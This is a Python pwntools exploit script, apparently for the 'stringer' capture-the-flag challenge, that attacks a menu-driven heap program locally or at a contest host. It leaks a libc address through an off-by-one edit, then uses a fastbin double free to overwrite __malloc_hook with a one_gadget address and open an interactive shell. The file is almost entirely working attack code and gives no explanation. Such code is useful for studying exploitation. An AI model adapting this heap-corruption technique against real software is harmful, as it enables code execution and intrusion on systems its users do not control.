#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./stringer"
elf=ELF(pwn_file)
libc=elf.libc

if len(sys.argv)==1:
    conn=process(pwn_file)
    pid=conn.pid
else:
    conn=remote("stringer.2018.teamrois.cn",7272)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    log.debug("libc address:0x%x"%libc.address)
    pause()

def add(size,content):
    conn.sendlineafter("choice: ","1")
    conn.sendlineafter("please input string length: ",str(size))
    conn.recvuntil("please input the string content: ")
    if len(content) == size or content=='\n':
        conn.send(content)
    else:
        conn.sendline(content)
    conn.recvuntil("your string: ")
    data=conn.recvuntil("\n1.")[:-3]
    return data

def dele(idx):
    conn.sendlineafter("choice: ","4")
    conn.sendlineafter("please input the index: ",str(idx))

def edit(idx,byteidx):
    conn.sendlineafter("choice: ","3")
    conn.sendlineafter("please input the index: ",str(idx))
    conn.sendlineafter("input the byte index: ",str(byteidx))

add(0x28,"a"*0x28)
add(0xe8,"a"*0xe8)
add(0x20,"a")
dele(1)
edit(0,0x28)

data=add(0xe8,"\n")
print data.encode("hex")
libc.address=u64(data[:6].ljust(8,"\x00"))-0xa-0x3c4b00

add(0x60,"a")#4
add(0x60,"a")#5
add(0x20,"a")#6
dele(4)
dele(5)
dele(4)
add(0x60,p64(libc.sym["__malloc_hook"]-0x13))
add(0x60,"a")
add(0x60,"a")
add(0x60,"a"*3+p64(libc.address+0xf02a4))
dele(4)
dele(4)
conn.interactive()











